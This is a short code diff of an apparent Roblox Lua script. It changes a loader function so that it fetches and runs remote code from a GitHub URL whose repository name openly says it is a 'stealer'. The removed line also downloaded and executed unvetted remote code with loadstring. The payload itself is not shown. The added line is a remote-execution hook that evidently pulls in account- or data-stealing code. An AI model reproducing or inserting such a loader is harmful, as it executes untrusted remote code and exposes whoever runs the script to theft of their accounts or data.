@@ -101,7 +101,7 @@ end
 local function runLoader()
     print("Running loader")
     pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptsz99/KONI/refs/heads/main/LUA"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/KuniDevLua/MY-OWN-FUCKING-STEALER/refs/heads/main/DAMN"))()
     end)
 end
 
